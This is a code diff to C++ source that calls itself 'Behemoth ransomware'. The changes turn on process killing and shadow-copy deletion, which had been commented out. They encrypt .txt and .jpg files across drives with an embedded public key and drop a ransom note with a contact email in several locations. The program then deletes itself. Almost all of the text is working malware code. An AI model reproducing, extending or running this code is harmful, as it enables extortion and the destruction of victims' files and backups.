@@ -14,7 +14,14 @@
 #include "Helpers/del_shadows.h"
 #include "Helpers/json.hpp"
 #include "Core/file_enc.h"
+#include "Helpers/create_readmes.h"
+#include "Helpers/self_dest.h"
+#include "Helpers/desktop_path.h"
 
+
+const std::string PUBLIC_KEY = "MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAydGwvuurofZFGQD6mDYPjq4JJDLGjiSBREcqAhb/2+njKYcJw4yyJlicn/vhDpiwoar2tMK0Ry1tY44hWjbrVBYNM+dav8qiTj9KtHyI9iZwqmZNU9hhlpKcYiirCYhS9d4GqDBTe/GciueB5rcI/0s8UAtkrHprJLGWHFo1RgooJxRcKnxhOS3Em+PYsenlrLgeCKKMMzn896pG5J6SI7K+bamgTu9d6Xi01ZFtN5glIQGspZd0guJOkVN2Gf0Lp8Yq/KA9rGQv7G8SlyQbyssDPVDXz/5fHuYOVedlseFllkNKEqfCPcvgp/Jrmr3h4D3s8avhrzAP2wJUXqRR+YwFLYHkglJ/zVubPqgtAJrb5VnbZeMLhyILbfEV8CW8ydpYMsmSeWuSFDz7z9Bg7EE6EFCZ4qx6vIzgNg/GOMsUyyarztnf/N9T2QWXbcex6/+c34kNO3y8aay1xkK8AAvk8bkOBWIEDS7bvJ7c0CYkZZehqSCJ/vkr706Ye27HAgMBAAE=";
+const std::string OFF_README = "Your files has been encrypted with Behemoth ransomware.\n\nThe file hash for this executable is XXXXXXXXXXXXXXXXXXXXXXXXXXXX\n\nConstant us at constant@c0nstant.ca with the executable's hash to decrypt your files.\n";
+bool OFFLINE_ENC = true;
 
 
 int offline_enc();
@@ -23,7 +30,10 @@ int online_enc();
 
 
 int main() {
-    offline_enc();
+    if (OFFLINE_ENC) {
+        offline_enc();
+        self_destruct();
+    }
 
     return 0;
 }
@@ -46,6 +56,7 @@ int offline_enc() {
     // Path to a text file for storing file paths
     std::wstring filePath = wstrTempPath + L"\\" + randomWStr + L".txt";
 
+
     // Search for files in each drive & ignore forbidden folders 
     std::vector<std::wstring> fileTypes = { L".txt", L".jpg" };
     std::unordered_set<std::wstring> forbiddenDirs = { L"System Volume Information", L"Windows", L"Program Files", L"Users", 
@@ -56,8 +67,8 @@ int offline_enc() {
         SaveResultsToFile(filePath, files); 
     }
     
-    // KillProcs();
-    // nuke_vss();
+    KillProcs();
+    nuke_vss();
 
     std::vector<std::wstring> filesToProcess;
     std::wifstream inFile(filePath);
@@ -67,10 +78,12 @@ int offline_enc() {
     }
     inFile.close();
 
+
     // Use 32 threads for parallel processing
     const int maxThreads = std::min<int>(32, static_cast<int>(std::thread::hardware_concurrency()));
     std::vector<std::map<std::string, std::map<std::string, std::string>>> results(maxThreads);
     std::mutex resultMutex;
+
 
     // Use parallelism to process multiple files simultaneously
     auto processFiles = [&](int tid, int start, int end) {
@@ -81,7 +94,7 @@ int offline_enc() {
             WideCharToMultiByte(CP_UTF8, 0, filesToProcess[i].c_str(), -1, &narrowFilePath[0], requiredSize, NULL, NULL);
             narrowFilePath.pop_back(); // Remove the null-terminator
 
-            auto encResult = AESEncrypt(narrowFilePath);
+            auto encResult = AESEncrypt(narrowFilePath, PUBLIC_KEY);
             for (const auto& [key, value] : encResult) {
                 results[tid][key] = value;
             }
@@ -100,6 +113,7 @@ int offline_enc() {
         t.join();
     }
 
+
     // Merge results or dictionaries into one
     std::map<std::string, std::map<std::string, std::string>> combinedResult;
     for (const auto& res : results) {
@@ -108,17 +122,31 @@ int offline_enc() {
         }
     }
 
+
     // Convert combined dictionary to JSON and save them to a random file in TEMP
     nlohmann::json j = combinedResult;
 
-    // 6. Save the JSON to a randomly named file.
-    std::string randomTempStrForJson = gen_str(8);  // Assuming you have this function from your provided code.
-    std::wstring jsonFilePath(randomTempStrForJson.begin(), randomTempStrForJson.end());
-    std::wstring jsonPath = wstrTempPath + L"\\" + jsonFilePath + L".json";
-    std::ofstream jsonFile(jsonPath);
+
+    // 6. Save the JSON to a randomly named file in Desktop
+    std::filesystem::path desktopPath = getDesktopPath();
+    std::string randomStr = gen_str(8);
+    std::wstring jsonFileName = L"FILES_" + std::wstring(randomStr.begin(), randomStr.end()) + L".json";
+    std::filesystem::path finalJsonPath = desktopPath / jsonFileName;
+
+    std::ofstream jsonFile(finalJsonPath);
     jsonFile << j.dump(4);
     jsonFile.close();
 
+
+    
+    // save readme to multiple locations
+    std::string randomReadme = gen_str(8);
+    std::string readmeFileName = "README_" + randomReadme + ".txt";
+    create_readmes(OFF_README, readmeFileName);
+
+
+    // call self-destruction
+    self_destruct();
 
     return 0;
 }
